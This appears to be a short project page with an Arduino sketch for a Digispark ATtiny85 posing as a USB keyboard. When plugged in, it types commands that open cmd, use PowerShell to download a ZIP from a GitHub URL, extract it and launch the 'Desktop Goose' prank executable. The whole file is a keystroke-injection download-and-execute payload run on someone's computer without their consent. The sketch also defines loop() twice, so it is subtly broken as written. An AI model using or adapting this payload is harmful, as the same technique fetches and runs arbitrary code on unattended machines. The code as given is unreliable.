# Desktop-Goose
LINK

Arduino IDE (Digispark ATINY85)
Link ZIP:

#include "DigiKeyboardPtBr.h"

void setup() {
  pinMode(0, OUTPUT); 
  pinMode(1, OUTPUT);     
}

void loop() {  
  pisca_led(100);
  
  DigiKeyboardPtBr.sendKeyStroke(0);
  DigiKeyboardPtBr.delay(100);

  // Abrir Executar (Win + R)
  DigiKeyboardPtBr.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboardPtBr.delay(100);

  // Abrir CMD
  DigiKeyboardPtBr.println("cmd");
  DigiKeyboardPtBr.delay(500);
  DigiKeyboardPtBr.sendKeyStroke(KEY_ENTER);
  DigiKeyboardPtBr.delay(3000);   

  // Comando PowerShell para baixar o ZIP do Desktop Goose v0.31
  DigiKeyboardPtBr.print(
    "powershell -Command \"Invoke-WebRequest -Uri 'https://github.com/MrNuno/Desktop-Goose/raw/refs/heads/main/DesktopGoose%20v0.31.zip' -OutFile $env:TEMP\\goose.zip\""
  );
  DigiKeyboardPtBr.sendKeyStroke(KEY_ENTER);
  DigiKeyboardPtBr.delay(20000); // aguarda download (aumente se internet for lenta)

  // Descompactar o ZIP para a pasta TEMP
  DigiKeyboardPtBr.print(
    "powershell -Command \"Expand-Archive -Path $env:TEMP\\goose.zip -DestinationPath $env:TEMP -Force\""
  );
  DigiKeyboardPtBr.sendKeyStroke(KEY_ENTER);
  DigiKeyboardPtBr.delay(5000); // espera descompactar

  // Executar o GooseDesktop.exe extraído
  DigiKeyboardPtBr.print("start \"\" \"%TEMP%\\DesktopGoose v0.31\\GooseDesktop.exe\"");
  DigiKeyboardPtBr.sendKeyStroke(KEY_ENTER);

  // Piscar LEDs indicando fim
  pisca_led(1000);

  // Loop vazio (não repetir)
  for(;;) { }
}

void pisca_led(int velocidade) {  
  for (int inicio = 1; inicio <= 10; inicio++) {
    digitalWrite(0, HIGH); 
    digitalWrite(1, HIGH); 
    DigiKeyboardPtBr.delay(velocidade);  
    digitalWrite(0, LOW); 
    digitalWrite(1, LOW); 
    DigiKeyboardPtBr.delay(velocidade);  
  } 
}


void loop() {
  // Não precisa repetir
}


